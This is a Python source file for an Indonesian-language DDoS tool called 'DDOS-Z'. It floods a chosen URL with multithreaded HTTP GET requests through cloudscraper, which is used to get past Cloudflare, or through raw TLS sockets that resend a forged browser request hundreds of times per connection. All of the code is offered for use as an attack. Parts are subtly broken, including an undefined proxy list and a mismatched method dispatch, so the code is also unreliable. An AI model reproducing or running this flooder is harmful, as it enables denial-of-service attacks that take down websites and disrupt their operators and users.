# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.RED+">>>"+Fore.WHITE+" Proses => " + str((until - datetime.datetime.now()).total_seconds()) + " sisa waktu ")
        else:
            stdout.flush()
            stdout.write("\r"+Fore.RED+">>>"+Fore.WHITE+" SELESAI "+Fore.RED+"<<<                                    \n")
            return

def get_info_l7():
    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"URL      "+Fore.RED+": "+Fore.WHITE)
    target = input()
    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"Thread   "+Fore.RED+": "+Fore.WHITE)
    thread = input()
    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"TIME     "+Fore.RED+": "+Fore.WHITE)
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t

def title():
    system('clear')
    stdout.write("                                    \n")
    stdout.write("\n")
    stdout.write(""+Fore.RED   +">>>>>  WELCOME    TO    DDOS-Z  <<<<<\n")
    stdout.write("\n")
    stdout.write(""+Fore.GREEN+"Pilih Metode (cfb)  or  (sky)\n")
    stdout.write(""+Fore.RED+">>> PASTIKAN TERHUBUNG INTERNET <<<\n")
    stdout.write("\n")
##############################################################################################
def command():
    stdout.write(Fore.RED+"╔═══"+Fore.RED+"["""+Fore.RED+""+Fore.RED+"DDOS-Z"+Fore.RED+"]"+Fore.RED+"\n╚══> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear" or command == "Clear" or command == "CLEAR":
        clear()
        title()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "sky" or command == "SKY" or command == "Sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "exit" or command == "Exit" or command == "EXIT":
        exit()

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion       
                        
#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion
if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        system('clear')
        stdout.write(Fore.RED+"ERROR\n")
        stdout.write("\n")
        stdout.write(f"masukan command ini : python {sys.argv[0]}\n")
        stdout.write("\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write(Fore.RED+"Metode ERROR\nMetode yang tersedia: cfb, sky\n")